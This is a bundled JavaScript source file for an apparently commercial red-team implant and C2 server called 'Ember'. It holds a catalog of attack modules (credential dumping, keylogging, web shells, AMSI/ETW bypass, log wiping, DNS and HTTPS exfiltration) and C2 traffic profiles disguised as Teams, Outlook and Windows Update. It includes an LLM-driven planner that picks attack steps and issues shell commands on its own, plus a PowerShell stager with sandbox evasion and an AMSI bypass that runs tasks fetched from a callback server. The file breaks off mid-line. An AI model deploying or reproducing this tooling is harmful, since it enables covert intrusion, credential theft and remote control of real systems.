import {
  getSafetyEngine,
  init_safety_engine
} from "./chunk-4SXJ2GAM.js";
import {
  init_llm,
  invokeLLM
} from "./chunk-BO7KGWQN.js";

// server/lib/ember-agent-core.ts
init_llm();
init_safety_engine();
var EMBER_VERSION = "1.0.0-alpha";
var EMBER_CODENAME = "Ember";
var EMBER_AGENT_TYPE = "ember";
var EMBER_CAPABILITY_CATALOG = [
  // ─── Reconnaissance ───
  {
    id: "ember.recon.network_mapper",
    name: "Network Mapper",
    category: "recon",
    version: "1.0.0",
    attackTechniques: ["T1046", "T1018", "T1016"],
    requirements: ["raw_socket"],
    loaded: false
  },
  {
    id: "ember.recon.service_fingerprint",
    name: "Service Fingerprinter",
    category: "recon",
    version: "1.0.0",
    attackTechniques: ["T1046"],
    requirements: ["tcp_connect"],
    loaded: false
  },
  {
    id: "ember.recon.ad_enumeration",
    name: "Active Directory Enumerator",
    category: "recon",
    version: "1.0.0",
    attackTechniques: ["T1087.002", "T1069.002", "T1482"],
    requirements: ["ldap_client", "windows"],
    loaded: false
  },
  {
    id: "ember.recon.cloud_metadata",
    name: "Cloud Metadata Harvester",
    category: "recon",
    version: "1.0.0",
    attackTechniques: ["T1552.005", "T1580"],
    requirements: ["http_client"],
    loaded: false
  },
  {
    id: "ember.recon.wifi_probe",
    name: "Wireless Network Probe",
    category: "recon",
    version: "1.0.0",
    attackTechniques: ["T1016.001"],
    requirements: ["wireless_interface"],
    loaded: false
  },
  // ─── Credential Operations ───
  {
    id: "ember.cred.memory_dump",
    name: "Memory Credential Extractor",
    category: "credential",
    version: "1.0.0",
    attackTechniques: ["T1003.001", "T1003.006"],
    requirements: ["elevated", "windows"],
    loaded: false
  },
  {
    id: "ember.cred.token_theft",
    name: "Token Impersonation",
    category: "credential",
    version: "1.0.0",
    attackTechniques: ["T1134.001", "T1134.003"],
    requirements: ["elevated", "windows"],
    loaded: false
  },
  {
    id: "ember.cred.kerberoast",
    name: "Kerberoasting Module",
    category: "credential",
    version: "1.0.0",
    attackTechniques: ["T1558.003"],
    requirements: ["domain_joined", "windows"],
    loaded: false
  },
  {
    id: "ember.cred.ssh_key_harvest",
    name: "SSH Key Harvester",
    category: "credential",
    version: "1.0.0",
    attackTechniques: ["T1552.004"],
    requirements: ["file_access"],
    loaded: false
  },
  {
    id: "ember.cred.browser_extract",
    name: "Browser Credential Extractor",
    category: "credential",
    version: "1.0.0",
    attackTechniques: ["T1555.003"],
    requirements: ["file_access"],
    loaded: false
  },
  // ─── Exploitation ───
  {
    id: "ember.exploit.shellcode_inject",
    name: "Shellcode Injector",
    category: "exploit",
    version: "1.0.0",
    attackTechniques: ["T1055.001", "T1055.012"],
    requirements: ["elevated"],
    loaded: false
  },
  {
    id: "ember.exploit.dll_sideload",
    name: "DLL Sideloader",
    category: "exploit",
    version: "1.0.0",
    attackTechniques: ["T1574.002"],
    requirements: ["file_write", "windows"],
    loaded: false
  },
  {
    id: "ember.exploit.web_shell",
    name: "Web Shell Deployer",
    category: "exploit",
    version: "1.0.0",
    attackTechniques: ["T1505.003"],
    requirements: ["file_write", "web_root_access"],
    loaded: false
  },
  // ─── Persistence ───
  {
    id: "ember.persist.registry",
    name: "Registry Persistence",
    category: "persistence",
    version: "1.0.0",
    attackTechniques: ["T1547.001", "T1112"],
    requirements: ["windows", "registry_access"],
    loaded: false
  },
  {
    id: "ember.persist.scheduled_task",
    name: "Scheduled Task Persistence",
    category: "persistence",
    version: "1.0.0",
    attackTechniques: ["T1053.005"],
    requirements: ["elevated"],
    loaded: false
  },
  {
    id: "ember.persist.cron_job",
    name: "Cron Job Persistence",
    category: "persistence",
    version: "1.0.0",
    attackTechniques: ["T1053.003"],
    requirements: ["linux", "cron_access"],
    loaded: false
  },
  {
    id: "ember.persist.service_install",
    name: "Service Installation",
    category: "persistence",
    version: "1.0.0",
    attackTechniques: ["T1543.003"],
    requirements: ["elevated"],
    loaded: false
  },
  {
    id: "ember.persist.bootkit_sim",
    name: "Bootkit Simulation",
    category: "persistence",
    version: "1.0.0",
    attackTechniques: ["T1542.003"],
    requirements: ["elevated", "windows"],
    loaded: false
  },
  // ─── Privilege Escalation ───
  {
    id: "ember.privesc.uac_bypass",
    name: "UAC Bypass",
    category: "privilege",
    version: "1.0.0",
    attackTechniques: ["T1548.002"],
    requirements: ["windows", "user_context"],
    loaded: false
  },
  {
    id: "ember.privesc.suid_exploit",
    name: "SUID Binary Exploiter",
    category: "privilege",
    version: "1.0.0",
    attackTechniques: ["T1548.001"],
    requirements: ["linux"],
    loaded: false
  },
  {
    id: "ember.privesc.kernel_exploit",
    name: "Kernel Exploit Loader",
    category: "privilege",
    version: "1.0.0",
    attackTechniques: ["T1068"],
    requirements: ["elevated_target"],
    loaded: false
  },
  // ─── Lateral Movement ───
  {
    id: "ember.lateral.psexec",
    name: "PsExec Lateral Movement",
    category: "lateral",
    version: "1.0.0",
    attackTechniques: ["T1569.002", "T1021.002"],
    requirements: ["smb_access", "admin_creds"],
    loaded: false
  },
  {
    id: "ember.lateral.wmi_exec",
    name: "WMI Remote Execution",
    category: "lateral",
    version: "1.0.0",
    attackTechniques: ["T1047"],
    requirements: ["wmi_access", "admin_creds", "windows"],
    loaded: false
  },
  {
    id: "ember.lateral.ssh_pivot",
    name: "SSH Pivot",
    category: "lateral",
    version: "1.0.0",
    attackTechniques: ["T1021.004"],
    requirements: ["ssh_creds"],
    loaded: false
  },
  {
    id: "ember.lateral.rdp_hijack",
    name: "RDP Session Hijack",
    category: "lateral",
    version: "1.0.0",
    attackTechniques: ["T1563.002"],
    requirements: ["elevated", "windows"],
    loaded: false
  },
  {
    id: "ember.lateral.pass_the_hash",
    name: "Pass-the-Hash",
    category: "lateral",
    version: "1.0.0",
    attackTechniques: ["T1550.002"],
    requirements: ["ntlm_hash", "windows"],
    loaded: false
  },
  // ─── Collection ───
  {
    id: "ember.collect.screenshot",
    name: "Screen Capture",
    category: "collection",
    version: "1.0.0",
    attackTechniques: ["T1113"],
    requirements: ["gui_access"],
    loaded: false
  },
  {
    id: "ember.collect.keylogger",
    name: "Keylogger",
    category: "collection",
    version: "1.0.0",
    attackTechniques: ["T1056.001"],
    requirements: ["user_context"],
    loaded: false
  },
  {
    id: "ember.collect.clipboard",
    name: "Clipboard Monitor",
    category: "collection",
    version: "1.0.0",
    attackTechniques: ["T1115"],
    requirements: ["user_context"],
    loaded: false
  },
  {
    id: "ember.collect.file_harvest",
    name: "Sensitive File Harvester",
    category: "collection",
    version: "1.0.0",
    attackTechniques: ["T1005", "T1039"],
    requirements: ["file_access"],
    loaded: false
  },
  // ─── Exfiltration ───
  {
    id: "ember.exfil.https_chunked",
    name: "HTTPS Chunked Exfiltration",
    category: "exfiltration",
    version: "1.0.0",
    attackTechniques: ["T1041"],
    requirements: ["http_client"],
    loaded: false
  },
  {
    id: "ember.exfil.dns_tunnel",
    name: "DNS Tunnel Exfiltration",
    category: "exfiltration",
    version: "1.0.0",
    attackTechniques: ["T1048.001"],
    requirements: ["dns_access"],
    loaded: false
  },
  {
    id: "ember.exfil.steganographic",
    name: "Steganographic Exfiltration",
    category: "exfiltration",
    version: "1.0.0",
    attackTechniques: ["T1027.003"],
    requirements: ["http_client"],
    loaded: false
  },
  // ─── Evasion ───
  {
    id: "ember.evasion.amsi_bypass",
    name: "AMSI Bypass",
    category: "evasion",
    version: "1.0.0",
    attackTechniques: ["T1562.001"],
    requirements: ["windows"],
    loaded: false
  },
  {
    id: "ember.evasion.etw_patch",
    name: "ETW Patching",
    category: "evasion",
    version: "1.0.0",
    attackTechniques: ["T1562.006"],
    requirements: ["windows", "elevated"],
    loaded: false
  },
  {
    id: "ember.evasion.log_cleaner",
    name: "Log Cleaner",
    category: "evasion",
    version: "1.0.0",
    attackTechniques: ["T1070.001", "T1070.002"],
    requirements: ["elevated"],
    loaded: false
  },
  {
    id: "ember.evasion.timestomp",
    name: "Timestamp Manipulation",
    category: "evasion",
    version: "1.0.0",
    attackTechniques: ["T1070.006"],
    requirements: ["file_access"],
    loaded: false
  },
  // ─── Cognitive Modules ───
  {
    id: "ember.cognitive.attack_planner",
    name: "AI Attack Planner",
    category: "cognitive",
    version: "1.0.0",
    attackTechniques: [],
    requirements: ["llm_access"],
    loaded: false
  },
  {
    id: "ember.cognitive.env_analyzer",
    name: "Environment Analyzer",
    category: "cognitive",
    version: "1.0.0",
    attackTechniques: ["T1082", "T1083"],
    requirements: [],
    loaded: false
  },
  {
    id: "ember.cognitive.evasion_adapter",
    name: "Adaptive Evasion Engine",
    category: "cognitive",
    version: "1.0.0",
    attackTechniques: ["T1027"],
    requirements: ["llm_access"],
    loaded: false
  }
];
var EmberCognitiveCore = class {
  constructor(config) {
    this.actionsTaken = 0;
    this.environmentContext = {};
    this.actionHistory = [];
    this.planCache = [];
    this.agentId = config.agentId;
    this.objective = config.objective;
    this.constraints = config.constraints;
    this.autonomyLevel = config.autonomyLevel;
    this.maxActions = config.maxActions;
    this.riskThreshold = config.riskThreshold;
    this.actionsTaken = 0;
  }
  /**
   * Analyze the target environment and produce an initial attack plan.
   * This is called when the agent first lands on a target.
   */
  async analyzeEnvironment(systemInfo) {
    this.environmentContext = {
      hostname: systemInfo.hostname,
      platform: systemInfo.platform,
      isElevated: systemInfo.isElevated,
      securityProducts: systemInfo.securityProducts || [],
      networkInterfaces: systemInfo.networkInterfaces,
      domain: systemInfo.domain
    };
    const systemPrompt = `You are the Cognitive Core of Ember, AC3's proprietary red team agent.
You are deployed on a target system during an authorized penetration test.
Your role is to analyze the environment and plan the next steps.

OBJECTIVE: ${this.objective}
CONSTRAINTS: ${this.constraints.join("; ")}
AUTONOMY LEVEL: ${this.autonomyLevel}
RISK THRESHOLD: ${this.riskThreshold}/100

You must respond with a JSON object containing:
1. "assessment" \u2014 your analysis of the environment's security posture
2. "initialPlan" \u2014 your recommended next actions (max 5)

Each planned action must include:
- "action": what to do
- "technique": MITRE ATT&CK technique ID
- "riskLevel": "low", "medium", or "high"
- "reasoning": why this action advances the objective`;
    const userPrompt = `Analyze this target environment and plan the attack:

SYSTEM INFO:
- Hostname: ${systemInfo.hostname}
- Username: ${systemInfo.username}
- Domain: ${systemInfo.domain || "N/A (workgroup)"}
- Platform: ${systemInfo.platform} ${systemInfo.architecture}
- OS Version: ${systemInfo.osVersion}
- Integrity: ${systemInfo.integrity}
- Elevated: ${systemInfo.isElevated}
- Process: ${systemInfo.processName} (PID ${systemInfo.pid})

NETWORK:
${systemInfo.networkInterfaces.map((n) => `  ${n.name}: ${n.ipv4} (${n.mac})`).join("\n")}

SECURITY PRODUCTS:
${(systemInfo.securityProducts || []).map((s) => `  ${s.name} (${s.type}) \u2014 ${s.running ? "RUNNING" : "STOPPED"}`).join("\n") || "  None detected"}

RUNNING PROCESSES (sample):
${(systemInfo.runningProcesses || []).slice(0, 20).map((p) => `  ${p.pid}: ${p.name} (${p.user})`).join("\n") || "  Not enumerated"}

ACTION HISTORY:
${this.actionHistory.map((a) => `  [${new Date(a.timestamp).toISOString()}] ${a.action} \u2192 ${a.result}`).join("\n") || "  No previous actions"}`;
    try {
      const response = await invokeLLM({
        _caller: "ember-cognitive-core:analyzeEnvironment",
        messages: [
          { role: "system", content: systemPrompt },
          { role: "user", content: userPrompt }
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "ember_cognitive_analysis",
            strict: true,
            schema: {
              type: "object",
              properties: {
                assessment: {
                  type: "object",
                  properties: {
                    networkSegment: { type: "string", description: "Identified network segment" },
                    securityPosture: { type: "string", enum: ["weak", "moderate", "strong", "hardened"] },
                    detectedControls: { type: "array", items: { type: "string" } },
                    recommendedApproach: { type: "string", description: "High-level strategy recommendation" }
                  },
                  required: ["networkSegment", "securityPosture", "detectedControls", "recommendedApproach"],
                  additionalProperties: false
                },
                initialPlan: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      action: { type: "string" },
                      technique: { type: "string" },
                      riskLevel: { type: "string", enum: ["low", "medium", "high"] },
                      reasoning: { type: "string" }
                    },
                    required: ["action", "technique", "riskLevel", "reasoning"],
                    additionalProperties: false
                  }
                }
              },
              required: ["assessment", "initialPlan"],
              additionalProperties: false
            }
          }
        }
      });
      const parsed = JSON.parse(response.choices[0].message.content || "{}");
      this.planCache = parsed.initialPlan || [];
      return parsed;
    } catch (error) {
      return this.heuristicAnalysis(systemInfo);
    }
  }
  /**
   * Decide the next action based on current state and intelligence.
   * Returns null if operator approval is needed.
   */
  async decideNextAction(currentState, intelligence, availableModules) {
    if (this.actionsTaken >= this.maxActions) return null;
    if (this.autonomyLevel === "manual") return null;
    if (this.planCache.length > 0) {
      const nextPlanned = this.planCache[0];
      const riskMap = { low: 20, medium: 50, high: 80 };
      const risk = riskMap[nextPlanned.riskLevel] || 50;
      if (this.autonomyLevel === "guided") return null;
      if (this.autonomyLevel === "semi_auto" && risk > this.riskThreshold) return null;
      this.planCache.shift();
      this.actionsTaken++;
      const matchingModule = availableModules.find(
        (m) => m.attackTechniques.includes(nextPlanned.technique)
      );
      return {
        taskId: `ember-cognitive-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
        type: matchingModule ? "execute_module" : "shell_command",
        priority: 5,
        params: matchingModule ? { moduleId: matchingModule.id, technique: nextPlanned.technique } : { command: nextPlanned.action },
        attackTechnique: nextPlanned.technique,
        timeoutSeconds: 300,
        requiresElevation: false,
        cognitiveReasoning: nextPlanned.reasoning,
        createdAt: Date.now(),
        assignedBy: "cognitive_core"
      };
    }
    try {
      const response = await invokeLLM({
        _caller: "ember-cognitive-core:decideNextAction",
        messages: [
          {
            role: "system",
            content: `You are Ember's Cognitive Core. Based on the current intelligence, decide the single best next action.
OBJECTIVE: ${this.objective}
CONSTRAINTS: ${this.constraints.join("; ")}
Actions taken: ${this.actionsTaken}/${this.maxActions}
Risk threshold: ${this.riskThreshold}/100

Respond with JSON: { "action": "...", "technique": "T####", "riskLevel": "low|medium|high", "reasoning": "...", "taskType": "execute_module|shell_command", "params": {} }`
          },
          {
            role: "user",
            content: `Current state: ${currentState}
Intelligence:
${JSON.stringify(intelligence.slice(-10), null, 2)}
Available modules: ${availableModules.map((m) => m.id).join(", ")}`
          }
        ]
      });
      const decision = JSON.parse(response.choices[0].message.content || "{}");
      if (!decision.action) return null;
      this.actionsTaken++;
      return {
        taskId: `ember-cognitive-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
        type: decision.taskType || "shell_command",
        priority: 5,
        params: decision.params || {},
        attackTechnique: decision.technique,
        timeoutSeconds: 300,
        requiresElevation: false,
        cognitiveReasoning: decision.reasoning,
        createdAt: Date.now(),
        assignedBy: "cognitive_core"
      };
    } catch {
      return null;
    }
  }
  /** Record an action result for learning */
  recordActionResult(action, result) {
    this.actionHistory.push({ action, result, timestamp: Date.now() });
    if (this.actionHistory.length > 100) this.actionHistory = this.actionHistory.slice(-80);
  }
  /** Heuristic fallback when LLM is unavailable */
  heuristicAnalysis(systemInfo) {
    const hasEDR = (systemInfo.securityProducts || []).some((s) => s.type === "edr" && s.running);
    const hasAV = (systemInfo.securityProducts || []).some((s) => s.type === "av" && s.running);
    const isWindows = systemInfo.platform.toLowerCase().includes("windows");
    const isDomainJoined = !!systemInfo.domain;
    const securityPosture = hasEDR ? "strong" : hasAV ? "moderate" : "weak";
    const detectedControls = [
      ...hasEDR ? ["EDR detected"] : [],
      ...hasAV ? ["AV detected"] : [],
      ...(systemInfo.securityProducts || []).filter((s) => s.type === "firewall").map((s) => `Firewall: ${s.name}`)
    ];
    const plan = [];
    plan.push({
      action: "Enumerate local system information and network configuration",
      technique: "T1082",
      riskLevel: "low",
      reasoning: "Baseline system enumeration is essential for planning further actions"
    });
    plan.push({
      action: "Discover adjacent hosts and services on the local network segment",
      technique: "T1046",
      riskLevel: "low",
      reasoning: "Understanding the network topology reveals lateral movement opportunities"
    });
    if (isWindows && systemInfo.isElevated) {
      plan.push({
        action: "Extract credentials from LSASS memory",
        technique: "T1003.001",
        riskLevel: "high",
        reasoning: "Elevated access on Windows enables credential extraction for lateral movement"
      });
    } else if (isWindows && isDomainJoined) {
      plan.push({
        action: "Attempt Kerberoasting to extract service account hashes",
        technique: "T1558.003",
        riskLevel: "medium",
        reasoning: "Domain-joined system enables Kerberoasting without elevation"
      });
    } else {
      plan.push({
        action: "Search for SSH keys and credential files",
        technique: "T1552.004",
        riskLevel: "low",
        reasoning: "File-based credential harvesting is low-risk and often productive"
      });
    }
    if (hasEDR) {
      plan.push({
        action: "Patch ETW and AMSI to reduce detection surface",
        technique: "T1562.001",
        riskLevel: "medium",
        reasoning: "EDR detected \u2014 reducing telemetry improves operational security"
      });
    }
    return {
      assessment: {
        networkSegment: systemInfo.networkInterfaces[0]?.ipv4?.replace(/\.\d+$/, ".0/24") || "unknown",
        securityPosture,
        detectedControls,
        recommendedApproach: hasEDR ? "Stealth-first approach: minimize process creation, use in-memory techniques" : "Standard approach: enumerate, escalate, pivot"
      },
      initialPlan: plan
    };
  }
  getStatus() {
    return {
      active: true,
      currentObjective: this.objective,
      plannedActions: this.planCache,
      autonomousActionsTaken: this.actionsTaken,
      autonomousActionsRemaining: this.maxActions - this.actionsTaken,
      environmentAssessment: {
        networkSegment: this.environmentContext.networkInterfaces?.[0]?.ipv4?.replace(/\.\d+$/, ".0/24") || "unknown",
        securityPosture: "moderate",
        detectedControls: (this.environmentContext.securityProducts || []).map((s) => s.name),
        recommendedApproach: "Analyzing..."
      }
    };
  }
};
var EMBER_TRAFFIC_PROFILES = [
  {
    id: "chrome_browsing",
    name: "Chrome Web Browsing",
    description: "Mimics Google Chrome browsing traffic with realistic headers and timing",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'
    },
    urlPatterns: ["/api/v1/sync", "/api/v1/telemetry", "/api/v1/config", "/api/v1/update"],
    responseContentTypes: ["application/json", "application/octet-stream"],
    timing: { minIntervalMs: 5e3, maxIntervalMs: 3e4, burstSize: 3, burstIntervalMs: 500 },
    payloadEncoding: "base64_in_json"
  },
  {
    id: "teams_api",
    name: "Microsoft Teams API",
    description: "Mimics Microsoft Teams presence/notification polling",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Teams/1.6.00.28567",
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6IjEyMzQ1Njc4OTAi...",
      "X-Ms-Client-Request-Id": ""
    },
    urlPatterns: ["/api/chatsvcagg/v1/threads", "/api/mt/part/emea-03/beta/users/me/presence", "/api/csa/api/v1/teams"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 1e4, maxIntervalMs: 6e4, burstSize: 1, burstIntervalMs: 0 },
    payloadEncoding: "base64_in_json"
  },
  {
    id: "outlook_sync",
    name: "Outlook Email Sync",
    description: "Mimics Outlook/Exchange email synchronization traffic",
    headers: {
      "User-Agent": "Microsoft Outlook 16.0",
      "Content-Type": "application/json; charset=utf-8",
      "Accept": "application/json",
      "X-AnchorMailbox": "user@contoso.com"
    },
    urlPatterns: ["/api/v2.0/me/mailfolders/inbox/messages", "/api/v2.0/me/events", "/api/v2.0/me/contacts"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 3e4, maxIntervalMs: 12e4, burstSize: 5, burstIntervalMs: 200 },
    payloadEncoding: "base64_in_json"
  },
  {
    id: "slack_websocket",
    name: "Slack WebSocket",
    description: "Mimics Slack real-time messaging WebSocket connection",
    headers: {
      "User-Agent": "Mozilla/5.0 Slack/4.35.126",
      "Origin": "https://app.slack.com",
      "Sec-WebSocket-Protocol": "wss"
    },
    urlPatterns: ["/ws/connect", "/api/rtm.connect", "/api/conversations.history"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 1e3, maxIntervalMs: 5e3, burstSize: 10, burstIntervalMs: 100 },
    payloadEncoding: "base64_in_json"
  },
  {
    id: "windows_update",
    name: "Windows Update",
    description: "Mimics Windows Update check-in traffic",
    headers: {
      "User-Agent": "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.50",
      "Content-Type": "application/soap+xml; charset=utf-8",
      "Accept": "*/*"
    },
    urlPatterns: ["/v6/windowsupdate/redir/muv4wuredir.cab", "/v6/windowsupdate/selfupdate/WSUS3.cab"],
    responseContentTypes: ["application/octet-stream", "application/soap+xml"],
    timing: { minIntervalMs: 3e5, maxIntervalMs: 36e5, burstSize: 1, burstIntervalMs: 0 },
    payloadEncoding: "chunked_in_headers"
  },
  {
    id: "cloudflare_api",
    name: "Cloudflare API",
    description: "Mimics Cloudflare API polling for DNS/WAF status",
    headers: {
      "User-Agent": "cloudflare-sdk/1.0",
      "Content-Type": "application/json",
      "Authorization": "Bearer cf_..."
    },
    urlPatterns: ["/client/v4/zones", "/client/v4/user/tokens/verify", "/client/v4/accounts"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 6e4, maxIntervalMs: 3e5, burstSize: 2, burstIntervalMs: 1e3 },
    payloadEncoding: "base64_in_json"
  }
];
var EmberAgentManager = class {
  constructor() {
    this.agents = /* @__PURE__ */ new Map();
    this.taskQueues = /* @__PURE__ */ new Map();
    this.cognitiveCores = /* @__PURE__ */ new Map();
    this.swarms = /* @__PURE__ */ new Map();
    this.intelligencePool = [];
  }
  /** Register a new Ember agent */
  registerAgent(config) {
    const agentId = config.agentId;
    this.agents.set(agentId, {
      ..."initializing",
      config
    });
    this.taskQueues.set(agentId, []);
    if (config.cognitive.enabled) {
      this.cognitiveCores.set(agentId, new EmberCognitiveCore({
        agentId,
        objective: config.cognitive.objective || "Assess security posture",
        constraints: config.cognitive.constraints,
        autonomyLevel: config.autonomy,
        maxActions: config.cognitive.maxAutonomousActions,
        riskThreshold: config.cognitive.riskThreshold
      }));
    }
    const token = `ember-${agentId.slice(0, 8)}-${Date.now().toString(36)}`;
    return { agentId, registrationToken: token };
  }
  /** Process an incoming beacon from an Ember agent */
  async processBeacon(beacon) {
    const agentEntry = this.agents.get(beacon.agentId);
    if (!agentEntry) {
      return { tasks: [] };
    }
    agentEntry.lastBeacon = beacon;
    const pendingTasks = this.taskQueues.get(beacon.agentId) || [];
    const tasksToSend = pendingTasks.splice(0, 10);
    const cognitiveCore = this.cognitiveCores.get(beacon.agentId);
    if (cognitiveCore) {
      try {
        const payload = JSON.parse(
          Buffer.from(beacon.encryptedPayload, "base64").toString()
        );
        if (payload.intelligence) {
          this.intelligencePool.push(...payload.intelligence);
          if (this.intelligencePool.length > 1e4) {
            this.intelligencePool = this.intelligencePool.slice(-8e3);
          }
        }
        const cognitiveTask = await cognitiveCore.decideNextAction(
          beacon.state,
          this.intelligencePool.filter((i) => i.sourceAgentId === beacon.agentId),
          agentEntry.config.capabilities.filter((c) => c.loaded)
        );
        if (cognitiveTask) {
          const safety = getSafetyEngine(agentEntry.config.engagementId);
          const assessment = safety.assessCommand(
            cognitiveTask.type,
            JSON.stringify(cognitiveTask.params),
            agentEntry.config.network.callbackUrls[0] || "unknown"
          );
          if (assessment.allowed) {
            cognitiveTask.safetyAssessment = {
              allowed: true,
              riskScore: assessment.blastRadius.riskScore,
              reason: assessment.reason
            };
            tasksToSend.push(cognitiveTask);
          }
        }
      } catch {
      }
    }
    return {
      tasks: tasksToSend,
      swarmUpdates: this.getSwarmDataForAgent(beacon.agentId)
    };
  }
  /** Queue a task for an agent */
  queueTask(agentId, task) {
    const queue = this.taskQueues.get(agentId);
    if (!queue) return false;
    const agentEntry = this.agents.get(agentId);
    if (agentEntry) {
      const safety = getSafetyEngine(agentEntry.config.engagementId);
      const assessment = safety.assessCommand(
        task.type,
        JSON.stringify(task.params),
        agentEntry.config.network.callbackUrls[0] || "unknown"
      );
      task.safetyAssessment = {
        allowed: assessment.allowed,
        riskScore: assessment.blastRadius.riskScore,
        reason: assessment.reason
      };
      if (!assessment.allowed) return false;
    }
    const insertIdx = queue.findIndex((t) => t.priority < task.priority);
    if (insertIdx === -1) queue.push(task);
    else queue.splice(insertIdx, 0, task);
    return true;
  }
  /** Get swarm data for a specific agent */
  getSwarmDataForAgent(agentId) {
    for (const [swarmId, swarm] of this.swarms) {
      if (swarm.peers.some((p) => p.agentId === agentId)) {
        return swarm;
      }
    }
    return void 0;
  }
  /** Create a new swarm from existing agents */
  createSwarm(swarmId, agentIds, coordinatorId) {
    const peers = agentIds.map((id) => {
      const agent = this.agents.get(id);
      return {
        agentId: id,
        lastSeen: Date.now(),
        state: "active",
        hostname: agent?.config.name || "unknown",
        capabilities: agent?.config.capabilities.map((c) => c.id) || []
      };
    });
    const swarm = {
      swarmId,
      role: "coordinator",
      peers,
      sharedIntelligence: [],
      taskAssignments: [],
      evasionState: {
        compromisedAgents: [],
        monitoredChannels: [],
        safeChannels: ["https_beacon", "doh_tunnel", "p2p_mesh"]
      }
    };
    this.swarms.set(swarmId, swarm);
    return swarm;
  }
  /** Get fleet overview */
  getFleetOverview() {
    const byState = {};
    const byProfile = {};
    const byPlatform = {};
    let pendingTasks = 0;
    for (const [id, agent] of this.agents) {
      const state = agent.lastBeacon?.state || "initializing";
      byState[state] = (byState[state] || 0) + 1;
      byProfile[agent.config.profile] = (byProfile[agent.config.profile] || 0) + 1;
      byPlatform[agent.config.platform] = (byPlatform[agent.config.platform] || 0) + 1;
      pendingTasks += (this.taskQueues.get(id) || []).length;
    }
    return {
      totalAgents: this.agents.size,
      byState,
      byProfile,
      byPlatform,
      activeSwarms: this.swarms.size,
      totalIntelligence: this.intelligencePool.length,
      pendingTasks
    };
  }
  /** Get agent details */
  getAgent(agentId) {
    return this.agents.get(agentId)?.config;
  }
  /** Get all agents */
  getAllAgents() {
    const result = [];
    for (const [id, agent] of this.agents) {
      result.push({
        agentId: id,
        config: agent.config,
        state: agent.lastBeacon?.state || "initializing",
        lastSeen: agent.lastBeacon?.timestamp || agent.config.beacon.killDate || 0
      });
    }
    return result;
  }
  /** Terminate an agent */
  terminateAgent(agentId) {
    const queue = this.taskQueues.get(agentId);
    if (!queue) return false;
    queue.unshift({
      taskId: `ember-terminate-${Date.now()}`,
      type: "self_destruct",
      priority: 10,
      params: { cleanTraces: true },
      timeoutSeconds: 60,
      requiresElevation: false,
      createdAt: Date.now(),
      assignedBy: "operator"
    });
    return true;
  }
  /** Get cognitive core status for an agent */
  getCognitiveStatus(agentId) {
    const core = this.cognitiveCores.get(agentId);
    return core ? core.getStatus() : null;
  }
};
function generateEmberPayload(config) {
  const generators = {
    powershell_oneliner: () => generatePowerShellOneLiner(config),
    powershell_script: () => generatePowerShellScript(config),
    bash_oneliner: () => generateBashOneLiner(config),
    bash_script: () => generateBashScript(config),
    python_stager: () => generatePythonStager(config),
    dll_sideload: () => generateDLLStub(config),
    msi_installer: () => generateMSIStub(config),
    hta_dropper: () => generateHTADropper(config),
    macro_document: () => generateMacroStub(config),
    iso_container: () => generateISOStub(config),
    lnk_shortcut: () => generateLNKStub(config),
    service_executable: () => generateServiceExeStub(config),
    elf_binary: () => generateELFStub(config),
    shellcode_raw: () => generateShellcodeStub(config),
    bof_module: () => generateBOFStub(config)
  };
  return generators[config.format]();
}
function generatePowerShellOneLiner(config) {
  const callbackUrl = config.callback.urls[0];
  const regToken = config.registrationToken;
  const interval = config.beacon.intervalSeconds;
  const jitter = config.beacon.jitterPercent;
  const profile = config.profile;
  const evasionPreamble = config.evasion.antiDebugging ? `$d=[System.Diagnostics.Debugger]::IsAttached;if($d){exit};` : "";
  const sandboxCheck = config.evasion.sandboxDetection ? `$m=(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB;if($m -lt 2){exit};$p=(Get-Process).Count;if($p -lt 30){exit};` : "";
  const sleepPreamble = config.evasion.initialSleepMs > 0 ? `Start-Sleep -Milliseconds ${config.evasion.initialSleepMs};` : "";
  const amsiBypass = config.evasion.obfuscationLevel >= 3 ? `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true);` : "";
  const payload = `${evasionPreamble}${sandboxCheck}${sleepPreamble}${amsiBypass}$c='${callbackUrl}';$t='${regToken}';$i=${interval};$j=${jitter};$p='${profile}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$o=[System.Environment]::OSVersion.VersionString;$b=@{agentId=[guid]::NewGuid().ToString();name="ember-$h";token=$t;hostname=$h;username=$u;platform='windows';os=$o;profile=$p;interval=$i;jitter=$j};$r=Invoke-RestMethod -Uri "$c/api/ember/register" -Method POST -Body ($b|ConvertTo-Json) -ContentType 'application/json';while($true){try{$beacon=@{agentId=$r.agentId;sequence=0;state='active';timestamp=[DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()};$resp=Invoke-RestMethod -Uri "$c/api/ember/beacon" -Method POST -Body ($beacon|ConvertTo-Json) -ContentType 'application/json';if($resp.tasks){foreach($task in $resp.tasks){try{$out=Invoke-Expression $task.params.command 2>&1|Out-String;Invoke-RestMethod -Uri "$c/api/ember/result" -Method POST -Body (@{taskId=$task.taskId;agentId=$r.agentId;status='success';output=$out}|ConvertTo-Json) -ContentType 'application/json'}catch{}}}}catch{};$sleep=$i+[int]($i*$j/100*(Get-Random -Min -1 -Max 